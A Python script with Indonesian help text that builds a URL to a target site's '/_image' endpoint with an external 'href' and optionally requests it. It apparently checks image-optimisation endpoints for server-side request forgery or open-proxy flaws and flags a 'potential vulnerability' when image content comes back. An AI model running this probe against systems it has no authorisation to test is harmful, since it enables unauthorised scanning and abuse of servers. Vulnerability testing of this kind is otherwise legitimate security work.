import argparse
import urllib.parse

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'

def colorize_status_code(status_code):
    if 200 <= status_code < 300:
        return f"{Colors.GREEN}{status_code}{Colors.ENDC}"
    elif 300 <= status_code < 400:
        return f"{Colors.BLUE}{status_code}{Colors.ENDC}"
    elif 400 <= status_code < 500:
        return f"{Colors.YELLOW}{status_code}{Colors.ENDC}"
    elif 500 <= status_code < 600:
        return f"{Colors.RED}{status_code}{Colors.ENDC}"
    else:
        return f"{Colors.PURPLE}{status_code}{Colors.ENDC}"

def generate_image_url(target_url, image_url):
    
    if not target_url.endswith('/_image'):
        target_url = target_url.rstrip('/') + '/_image'
    
    encoded_image_url = urllib.parse.quote(image_url, safe='')
    
    full_url = f"{target_url}?href={encoded_image_url}"
    
    return full_url

def verify_with_requests(target_url, image_url, make_request=False):
    full_url = generate_image_url(target_url, image_url)
    
    print(f"{Colors.CYAN}[+] Generated URL:{Colors.ENDC}")
    print(full_url)
    print()
    
    if make_request:
        try:
            import requests
            print(f"{Colors.CYAN}[+] Sending HTTP request...{Colors.ENDC}")
            response = requests.get(full_url, timeout=10)
            
            colored_status = colorize_status_code(response.status_code)
            print(f"[+] Status Code: {colored_status}")
            print(f"[+] Content Type: {response.headers.get('content-type', 'Unknown')}")
            
            if response.status_code == 200:
                if 'image' in response.headers.get('content-type', '').lower():
                    print(f"{Colors.GREEN}[+] Server returned image content - Potential vulnerability detected!{Colors.ENDC}")
                elif '<html' in response.text.lower()[:100]:
                    print(f"{Colors.YELLOW}[-] Server returned HTML - May not be vulnerable{Colors.ENDC}")
                else:
                    content_preview = response.text[:200]
                    print(f"[+] Response preview: {repr(content_preview)}")
            elif 400 <= response.status_code < 500:
                print(f"{Colors.YELLOW}[-] Client error - Resource might not be accessible{Colors.ENDC}")
            elif 500 <= response.status_code < 600:
                print(f"{Colors.RED}[-] Server error - Internal server problem{Colors.ENDC}")
            else:
                print(f"{Colors.PURPLE}[!] Unexpected status code{Colors.ENDC}")
                    
        except ImportError:
            print(f"{Colors.RED}[-] Requests library not available. Install with: pip install requests{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error making request: {e}{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(
        description="Script untuk membuat dan memverifikasi URL dengan parameter _image",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh penggunaan:
  python image_url_generator.py -u https://target-site.com -i https://example.com/image.jpg
  python image_url_generator.py --url https://target.com --image https://example.com/image.jpg --request
        """
    )
    
    parser.add_argument(
        '-u', '--url',
        type=str,
        required=True,
        help='URL target (contoh: https://target-site.com)'
    )
    
    parser.add_argument(
        '-i', '--image',
        type=str,
        required=True,
        help='URL gambar dari sumber eksternal (contoh: https://example.com/image.jpg)'
    )
    
    parser.add_argument(
        '-r', '--request',
        action='store_true',
        help='Lakukan permintaan HTTP untuk verifikasi'
    )
    
    args = parser.parse_args()
    
    verify_with_requests(args.url, args.image, args.request)

if __name__ == "__main__":
    main()
